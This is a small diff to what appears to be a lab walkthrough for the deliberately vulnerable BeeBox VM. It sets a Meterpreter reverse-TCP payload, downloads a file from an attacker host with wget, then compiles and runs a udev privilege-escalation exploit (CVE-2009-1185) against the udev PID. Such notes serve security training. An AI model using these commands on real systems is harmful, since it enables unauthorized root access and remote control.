@@ -30,13 +30,12 @@ set LPORT 5000
 set PAYLOAD linux/x86/meterpreter/reverse_tcp 
 
 On BeeBox:  
-wget http://192.168.112.4/run -o /tmp/cd un 
+wget http://192.168.112.4/run -o /tmp/run    
 gcc cve-2009-1185.c -o /tmp/privescalation  
 chmod +x /tmp/privescalation  
 cd /tmp    
 ps aux | grep udev      
 ./privescalation (PID discovered with grep minus 1 - e.g. 2864 - 1 = 2863)  
-
 
 **Easy Way**  
 tar -xvf cve-2009-2692.tar  
